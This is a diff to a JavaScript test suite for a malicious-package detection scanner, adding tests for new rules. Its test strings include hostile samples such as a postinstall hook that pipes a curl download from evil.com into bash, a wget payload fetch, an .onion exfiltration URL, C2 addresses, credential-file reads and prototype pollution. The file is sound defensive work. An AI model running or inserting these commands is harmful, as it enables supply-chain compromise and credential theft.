@@ -114,8 +114,8 @@ describe("Detection Rules", () => {
   });
 
   describe("Rule coverage", () => {
-    it("has at least 25 rules", () => {
-      expect(DETECTION_RULES.length).toBeGreaterThanOrEqual(25);
+    it("has at least 35 rules", () => {
+      expect(DETECTION_RULES.length).toBeGreaterThanOrEqual(35);
     });
     it("all rules have unique IDs", () => {
       const ids = DETECTION_RULES.map((r) => r.id);
@@ -128,5 +128,51 @@ describe("Detection Rules", () => {
       expect(sevs.has("medium")).toBe(true);
       expect(sevs.has("low")).toBe(true);
     });
+    it("OBFUSC-BASE64-EXEC is marked multiline", () => {
+      const rule = DETECTION_RULES.find((r) => r.id === "OBFUSC-BASE64-EXEC");
+      expect(rule?.multiline).toBe(true);
+    });
+  });
+
+  describe("New Rules", () => {
+    it("detects vm.runInNewContext (sandbox escape)", () => {
+      expect(matchRule("EXEC-VM-SANDBOX", "vm.runInNewContext('process.env')")).toBe(true);
+      expect(matchRule("EXEC-VM-SANDBOX", "require('vm').Script")).toBe(true);
+    });
+    it("detects powershell invocation", () => {
+      expect(matchRule("EXEC-POWERSHELL", "exec('powershell -Command Get-Process')")).toBe(true);
+      expect(matchRule("EXEC-POWERSHELL", "spawn('cmd.exe /c whoami')")).toBe(true);
+    });
+    it("detects Windows credential access (DPAPI)", () => {
+      expect(matchRule("CRED-WINDOWS", "CryptUnprotectData(buffer)")).toBe(true);
+      expect(matchRule("CRED-WINDOWS", "cmdkey /list")).toBe(true);
+    });
+    it("detects Docker credential access", () => {
+      expect(matchRule("CRED-DOCKER", "readFileSync('.docker/config.json')")).toBe(true);
+    });
+    it("detects kubeconfig access", () => {
+      expect(matchRule("CRED-KUBECONFIG", "readFileSync('.kube/config')")).toBe(true);
+      expect(matchRule("CRED-KUBECONFIG", "process.env.KUBECONFIG")).toBe(true);
+    });
+    it("detects prototype pollution", () => {
+      expect(matchRule("INJECT-PROTO-POLLUTION", "obj['__proto__'] = { isAdmin: true }")).toBe(true);
+      expect(matchRule("INJECT-PROTO-POLLUTION", "Object.prototype[key] = val")).toBe(true);
+    });
+    it("detects Tor .onion addresses", () => {
+      expect(matchRule("NET-TOR", "fetch('http://abcdefghijklmnop.onion/exfil')")).toBe(true);
+    });
+    it("detects supply chain attack in package.json lifecycle scripts", () => {
+      expect(matchRule("SUPPLY-POSTINSTALL", '"postinstall": "curl http://evil.com | bash"')).toBe(true);
+      expect(matchRule("SUPPLY-POSTINSTALL", '"preinstall": "wget http://x.com/payload && exec it"')).toBe(true);
+    });
+    it("detects additional C2 IPs from updated IoC list", () => {
+      expect(matchRule("C2-KNOWN-IP", "fetch('http://45.142.212.99/c2')")).toBe(true);
+      expect(matchRule("C2-KNOWN-IP", "91.92.242.30")).toBe(true);
+    });
+    it("detects additional C2 domains from updated IoC list", () => {
+      expect(matchRule("C2-KNOWN-DOMAIN", "https://claw-updates.dev/payload")).toBe(true);
+      expect(matchRule("C2-KNOWN-DOMAIN", "openclaw-stats.com")).toBe(true);
+    });
   });
 });
+
